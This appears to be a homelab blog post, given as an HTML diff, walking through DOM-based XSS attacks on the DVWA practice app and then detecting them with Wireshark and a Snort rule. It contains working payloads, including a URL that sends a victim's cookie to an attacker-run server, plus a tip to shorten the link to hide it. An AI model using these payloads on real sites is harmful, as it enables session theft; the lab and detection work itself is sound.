@@ -1,0 +1,387 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>OWASP TOP 10: XSS (DOM) Attack - DVWA - SecurityNguyen Blog</title><meta name="Description" content="OWASP TOP 10 Project"><meta property="og:title" content="OWASP TOP 10: XSS (DOM) Attack - DVWA" />
+<meta property="og:description" content="OWASP TOP 10 Project" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://tryhardnguyen.github.io/posts/owasp-top-10-xss-stored/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-12-07T00:00:00+00:00" />
+<meta property="article:modified_time" content="2022-12-07T00:00:00+00:00" /><meta property="og:site_name" content="SecurityNguyen Site" />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="OWASP TOP 10: XSS (DOM) Attack - DVWA"/>
+<meta name="twitter:description" content="OWASP TOP 10 Project"/>
+<meta name="application-name" content="SecurityNguyen">
+<meta name="apple-mobile-web-app-title" content="SecurityNguyen"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://tryhardnguyen.github.io/posts/owasp-top-10-xss-stored/" /><link rel="prev" href="http://tryhardnguyen.github.io/posts/installing-kali-linux-attacker-cybersecurity-homelab/" /><link rel="next" href="http://tryhardnguyen.github.io/posts/owasp-top-10-csrf/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "OWASP TOP 10: XSS (DOM) Attack - DVWA",
+        "inLanguage": "en-us",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/tryhardnguyen.github.io\/posts\/owasp-top-10-xss-stored\/"
+        },"genre": "posts","keywords": "OWASP","wordcount":  891 ,
+        "url": "http:\/\/tryhardnguyen.github.io\/posts\/owasp-top-10-xss-stored\/","datePublished": "2022-12-07T00:00:00+00:00","dateModified": "2022-12-07T00:00:00+00:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "Nguyen Nguyen"
+            },"description": "OWASP TOP 10 Project"
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="SecurityNguyen Blog">SecurityNguyen</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/about/"> About </a><a class="menu-item" href="/categories/"> Categories </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="SecurityNguyen Blog">SecurityNguyen</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/about/" title="">About</a><a class="menu-item" href="/categories/" title="">Categories</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">OWASP TOP 10: XSS (DOM) Attack - DVWA</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Nguyen Nguyen</a></span>&nbsp;<span class="post-category">included in <a href="/categories/homelabs/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Homelabs</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2022-12-07">2022-12-07</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;891 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;5 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#methodology">Methodology</a></li>
+    <li><a href="#carrying-out-an-xss-dom-attack">Carrying out an XSS (DOM) Attack</a>
+      <ul>
+        <li><a href="#medium">Medium:</a></li>
+        <li><a href="#high">High</a></li>
+      </ul>
+    </li>
+    <li><a href="#network-perspective">Network Perspective</a>
+      <ul>
+        <li><a href="#how-to-detect-an-xss-dom-attack-using-snort">How to detect an XSS (DOM) Attack using snort?</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>NOTE: Click on the photo to zoom in.</p>
+<p>Today, we will be covering XSS (DOM). Our goal for today is</p>
+<ul>
+<li>Learn the methodology behind XSS (DOM)</li>
+<li>How to carry out an XSS (DOM) Attack</li>
+<li>Network Perspective</li>
+<li>How to detect an XSS (DOM) Attack using snort?</li>
+</ul>
+<p>Before we move into XSS (DOM), We need to know what XSS is.</p>
+<p>XSS stands for Cross-site scripting. Attackers would send victims links that contain malicious scripts. Then, once the victim clicks on the link, the browser will respond to the link, execute the script, do whatever the malicious script says, and potentially transfer information to the attacker.</p>
+<p>Visual representation:
+<figure><a class="lightgallery" href="/images/image-331.webp" title="/images/image-331.webp" data-thumbnail="/images/image-331.webp" data-sub-html="<h2>XSS-STORED Attack</h2>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/images/image-331.webp"
+            data-srcset="/images/image-331.webp, /images/image-331.webp 1.5x, /images/image-331.webp 2x"
+            data-sizes="auto"
+            alt="/images/image-331.webp" width="800" height="480" />
+    </a><figcaption class="image-caption">XSS-STORED Attack</figcaption>
+    </figure>
+Source: <a href="https://www.wallarm.com/what/what-is-xss-cross-site-scripting?ref=securitynguyen.com" target="_blank" rel="noopener noreffer ">https://www.wallarm.com/what/what-is-xss-cross-site-scripting</a></p>
+<h2 id="methodology">Methodology</h2>
+<p>XSS attack wherein the attack payload is executed as a result of modifying the DOM &ldquo;environment&rdquo; in the victim&rsquo;s browser used by the original client-side script so that the client-side code runs in an &ldquo;unexpected&rdquo; manner.</p>
+<p>The page itself (the HTTP response) does not change, but the client-side code in the page executes differently due to the malicious modifications in the DOM environment.</p>
+<p>This is in contrast to other XSS attacks (<a href="https://owasp.org/www-community/attacks/XSS?ref=securitynguyen.com#Stored_and_Reflected_XSS_Attacks" target="_blank" rel="noopener noreffer ">stored or reflected</a>), wherein the attack payload is placed on the response page (due to a server-side flaw).</p>
+<p>From DVWA: &ldquo;DOM Based XSS is a special case of reflected where the JavaScript is hidden in the URL and pulled out by JavaScript in the page while it is rendering rather than being embedded in the page when it is served. This can make it stealthier than other attacks, and WAFs or protections reading the page body do not see any malicious content.&rdquo;</p>
+<p><figure><a class="lightgallery" href="/images/image-330.webp" title="/images/image-330.webp" data-thumbnail="/images/image-330.webp" data-sub-html="<h2>XSS-STORED Attack</h2>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/images/image-330.webp"
+            data-srcset="/images/image-330.webp, /images/image-330.webp 1.5x, /images/image-330.webp 2x"
+            data-sizes="auto"
+            alt="/images/image-330.webp" width="800" height="480" />
+    </a><figcaption class="image-caption">XSS-STORED Attack</figcaption>
+    </figure>
+Source: <a href="https://owasp.org/www-community/attacks/xss/?ref=securitynguyen.com" target="_blank" rel="noopener noreffer ">https://owasp.org/www-community/attacks/xss/</a></p>
+<h2 id="carrying-out-an-xss-dom-attack">Carrying out an XSS (DOM) Attack</h2>
+<p>Objective:</p>
+<p>Run your JavaScript in another user&rsquo;s browser, and use this to steal the cookie of a logged-in user.</p>
+<p>This is what we&rsquo;re given:
+<a class="lightgallery" href="/images/image-332.webp" title="/images/image-332.webp" data-thumbnail="/images/image-332.webp">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/images/image-332.webp"
+            data-srcset="/images/image-332.webp, /images/image-332.webp 1.5x, /images/image-332.webp 2x"
+            data-sizes="auto"
+            alt="/images/image-332.webp" width="676" height="144" />
+    </a></p>
+<p>What we can do to steal a user cookie is the following:</p>
+<p>Set up our HTTP server:</p>
+<a class="lightgallery" href="/images/image-333.webp" title="/images/image-333.webp" data-thumbnail="/images/image-333.webp">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/images/image-333.webp"
+            data-srcset="/images/image-333.webp, /images/image-333.webp 1.5x, /images/image-333.webp 2x"
+            data-sizes="auto"
+            alt="/images/image-333.webp" width="626" height="176" />
+    </a>
+<p>Then craft our malicious script:</p>
+<p>Let&rsquo;s use this as our template:</p>
+<p>&ldquo;http://172.20.25.16/DVWA/vulnerabilities/xss_d/?default=English&rdquo;</p>
+<p>http://172.20.25.16/DVWA/vulnerabilities/xss_d/?default=<!-- raw HTML omitted -->window.location=&lsquo;http://192.168.233.189:9000/?cookie=&rsquo;+document.cookie<!-- raw HTML omitted --></p>
+<p>Once the victim pastes it in the URL, we will get the cookie.
+<a class="lightgallery" href="/images/image-334.webp" title="/images/image-334.webp" data-thumbnail="/images/image-334.webp">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/images/image-334.webp"
+            data-srcset="/images/image-334.webp, /images/image-334.webp 1.5x, /images/image-334.webp 2x"
+            data-sizes="auto"
+            alt="/images/image-334.webp" width="1027" height="116" />
+    </a>
+To make the link not noticeable, we can shorten it.</p>
+<h3 id="medium">Medium:</h3>
+<p>The developer has tried to add a simple pattern matching to remove any references to &ldquo;&lt;script&rdquo; to disable any JavaScript. Find a way to run JavaScript without using the script tags.</p>
+<p>Hint: You must first break out of the select block, then you can add an image with an onerror event</p>
+<p>Command:</p>
+<pre tabindex="0"><code>/vulnerabilities/xss_d/?default=English&gt;/option&gt;&lt;/select&gt;&lt;img src=&#39;x&#39; onerror=&#39;alert(1)&#39;&gt;
+</code></pre><p>We would get something like this:</p>
+<p><a class="lightgallery" href="/images/image-337.webp" title="/images/image-337.webp" data-thumbnail="/images/image-337.webp">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/images/image-337.webp"
+            data-srcset="/images/image-337.webp, /images/image-337.webp 1.5x, /images/image-337.webp 2x"
+            data-sizes="auto"
+            alt="/images/image-337.webp" width="932" height="371" />
+    </a>
+<a class="lightgallery" href="/images/image-335.webp" title="/images/image-335.webp" data-thumbnail="/images/image-335.webp">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/images/image-335.webp"
+            data-srcset="/images/image-335.webp, /images/image-335.webp 1.5x, /images/image-335.webp 2x"
+            data-sizes="auto"
+            alt="/images/image-335.webp" width="665" height="266" />
+    </a></p>
+<p>The code would look like this after execution:
+<a class="lightgallery" href="/images/image-336.webp" title="/images/image-336.webp" data-thumbnail="/images/image-336.webp">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/images/image-336.webp"
+            data-srcset="/images/image-336.webp, /images/image-336.webp 1.5x, /images/image-336.webp 2x"
+            data-sizes="auto"
+            alt="/images/image-336.webp" width="939" height="175" />
+    </a></p>
+<p>As you can see how a section of code in the URL fits the overall picture, we escaped the option block and then the select block and inserted a <!-- raw HTML omitted --> section.</p>
+<h3 id="high">High</h3>
+<p>The developer is now safely listing only the allowed languages. You must find a way to run your code without it going to the server.</p>
+<p>Hint: The fragment section of a URL (anything after the # symbol) does not get sent to the server and so cannot be blocked. The bad JavaScript being used to render the page reads the content from it when creating the page.</p>
+<p>Template:</p>
+<pre tabindex="0"><code>http://172.20.25.16/DVWA/vulnerabilities/xss_d/?default=English
+</code></pre><p>URL:</p>
+<pre tabindex="0"><code>http://172.20.25.16/DVWA/vulnerabilities/xss_d/#default=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+</code></pre><a class="lightgallery" href="/images/image-338.webp" title="/images/image-338.webp" data-thumbnail="/images/image-338.webp">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/images/image-338.webp"
+            data-srcset="/images/image-338.webp, /images/image-338.webp 1.5x, /images/image-338.webp 2x"
+            data-sizes="auto"
+            alt="/images/image-338.webp" width="938" height="435" />
+    </a>
+<h2 id="network-perspective">Network Perspective</h2>
+<p>We will set up our packet capture in pfSense and redo the attack. Then finally, analyze the packet capture in Wireshark.</p>
+<p>I will not demonstrate how to set up packet capture in pfSense because I have shown the steps many times. So, I&rsquo;m just going to provide the packet capture.</p>
+<p>Low:
+<a class="lightgallery" href="/images/image-339.webp" title="/images/image-339.webp" data-thumbnail="/images/image-339.webp">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/images/image-339.webp"
+            data-srcset="/images/image-339.webp, /images/image-339.webp 1.5x, /images/image-339.webp 2x"
+            data-sizes="auto"
+            alt="/images/image-339.webp" width="1431" height="795" />
+    </a>
+Since a lot is going on, let&rsquo;s filter it to HTTP.</p>
+<a class="lightgallery" href="/images/image-340.webp" title="/images/image-340.webp" data-thumbnail="/images/image-340.webp">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/images/image-340.webp"
+            data-srcset="/images/image-340.webp, /images/image-340.webp 1.5x, /images/image-340.webp 2x"
+            data-sizes="auto"
+            alt="/images/image-340.webp" width="1424" height="153" />
+    </a>
+<p>Here we see a GET request to English. Then, we see another GET request that is holding the XSS injection. If we were to decode the URL, we would be able to see the command using cyber chef.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>default<span style="color:#f92672">=</span>%3Cscript%3Ealert<span style="color:#f92672">(</span>%22Hacked%22<span style="color:#f92672">)</span>%3C/script%3E
+</span></span></code></pre></div><a class="lightgallery" href="/images/image-342.webp" title="/images/image-342.webp" data-thumbnail="/images/image-342.webp">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/images/image-342.webp"
+            data-srcset="/images/image-342.webp, /images/image-342.webp 1.5x, /images/image-342.webp 2x"
+            data-sizes="auto"
+            alt="/images/image-342.webp" width="997" height="538" />
+    </a>
+<p>I&rsquo;ll set it to High mode and capture the attack from there since I expect this mode to differ from the rest.</p>
+<p>High:</p>
+<p>When we open the packet, there&rsquo;s not much going on. However, the most important thing we&rsquo;re focusing on is HTTP GET:
+<a class="lightgallery" href="/images/image-343.webp" title="/images/image-343.webp" data-thumbnail="/images/image-343.webp">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/images/image-343.webp"
+            data-srcset="/images/image-343.webp, /images/image-343.webp 1.5x, /images/image-343.webp 2x"
+            data-sizes="auto"
+            alt="/images/image-343.webp" width="1421" height="327" />
+    </a></p>
+<p>We can see that the Request URI is /DVWA/vulnerabilities/xss_d/. But wait, I thought we sent: &ldquo;<!-- raw HTML omitted -->alert(&ldquo;1&rdquo;)<!-- raw HTML omitted -->&rdquo; what happen to the rest of the code?</p>
+<p>The (#) act as a comment. What the web server does is it takes: &ldquo;http://172.20.25.16/DVWA/vulnerabilities/xss_d/&rdquo; then take the rest (<!-- raw HTML omitted -->alert(&ldquo;1&rdquo;)<!-- raw HTML omitted -->) is left behind.</p>
+<h3 id="how-to-detect-an-xss-dom-attack-using-snort">How to detect an XSS (DOM) Attack using snort?</h3>
+<p>There is some approach to this. We could create an alert that only detects <!-- raw HTML omitted -->; however, we saw that this can be easily bypassed by using other tags such as <!-- raw HTML omitted -->.</p>
+<p>We could explicitly detect only requests that want the document.cookie.</p>
+<p>Or, we can create a detection rule around the &ldquo;sinks&rdquo;</p>
+<p>The following are some of the main sinks that can lead to DOM-XSS vulnerabilities:<br>
+document.write()<br>
+document.writeln()<br>
+document.domain<br>
+element.innerHTML<br>
+element.outerHTML<br>
+element.insertAdjacentHTML<br>
+element.onevent</p>
+<p>The following jQuery functions are also sinks that can lead to DOM-XSS vulnerabilities:<br>
+add()<br>
+after()<br>
+append()<br>
+animate()<br>
+insertAfter()<br>
+insertBefore()<br>
+before()<br>
+html()<br>
+prepend()<br>
+replaceAll()<br>
+replaceWith()<br>
+wrap()<br>
+wrapInner()<br>
+wrapAll()<br>
+has()<br>
+constructor()<br>
+init()<br>
+index()<br>
+jQuery.parseHTML()<br>
+$.parseHTML()</p>
+<p>We will keep it simple and detect if a GET request calls upon &ldquo;document.cookie&rdquo;</p>
+<p>Let&rsquo;s edit our snort rules</p>
+<pre tabindex="0"><code>sudo nano /etc/snort/rules/local.rules
+</code></pre><p>Our rule:</p>
+<pre tabindex="0"><code>alert tcp any any -&gt; 172.20.25.16 80 (content: &#34;GET&#34;; http_method; content:&#34;document.cookie&#34;; 
+msg: &#34;[ALERT] Requesting Cookie Found&#34;; sid: 1000001; rev: 1;)
+</code></pre><p>Start Snort:</p>
+<pre tabindex="0"><code>sudo snort -c /etc/snort/snort.conf -A console
+</code></pre><p>Now that running, let&rsquo;s make our attack
+<figure><a class="lightgallery" href="/images/image-344.webp" title="/images/image-344.webp" data-thumbnail="/images/image-344.webp" data-sub-html="<h2>Start Snort</h2>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/images/image-344.webp"
+            data-srcset="/images/image-344.webp, /images/image-344.webp 1.5x, /images/image-344.webp 2x"
+            data-sizes="auto"
+            alt="/images/image-344.webp" width="702" height="508" />
+    </a><figcaption class="image-caption">Start Snort</figcaption>
+    </figure></p>
+<p><a class="lightgallery" href="/images/image-345.webp" title="/images/image-345.webp" data-thumbnail="/images/image-345.webp">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/images/image-345.webp"
+            data-srcset="/images/image-345.webp, /images/image-345.webp 1.5x, /images/image-345.webp 2x"
+            data-sizes="auto"
+            alt="/images/image-345.webp" width="665" height="313" />
+    </a>
+<a class="lightgallery" href="/images/image-346.webp" title="/images/image-346.webp" data-thumbnail="/images/image-346.webp">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/images/image-346.webp"
+            data-srcset="/images/image-346.webp, /images/image-346.webp 1.5x, /images/image-346.webp 2x"
+            data-sizes="auto"
+            alt="/images/image-346.webp" width="1718" height="920" />
+    </a>
+<a class="lightgallery" href="/images/image-347.webp" title="/images/image-347.webp" data-thumbnail="/images/image-347.webp">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/images/image-347.webp"
+            data-srcset="/images/image-347.webp, /images/image-347.webp 1.5x, /images/image-347.webp 2x"
+            data-sizes="auto"
+            alt="/images/image-347.webp" width="1588" height="74" />
+    </a></p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2022-12-07</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="http://tryhardnguyen.github.io/posts/owasp-top-10-xss-stored/" data-title="OWASP TOP 10: XSS (DOM) Attack - DVWA" data-hashtags="OWASP"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="http://tryhardnguyen.github.io/posts/owasp-top-10-xss-stored/"><i class="fab fa-linkedin fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/owasp/">OWASP</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/installing-kali-linux-attacker-cybersecurity-homelab/" class="prev" rel="prev" title="Installing Attacker Machine - Kali Linux"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Installing Attacker Machine - Kali Linux</a>
+            <a href="/posts/owasp-top-10-csrf/" class="next" rel="next" title="OWASP TOP 10: CSRF (Cross Site Request Forgery)">OWASP TOP 10: CSRF (Cross Site Request Forgery)<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.111.3">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank"></a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/css/lightgallery-bundle.min.css"><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/twemoji@14.0.2/dist/twemoji.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/lightgallery.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/thumbnail/lg-thumbnail.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/zoom/lg-zoom.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"lightgallery":true,"twemoji":true};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
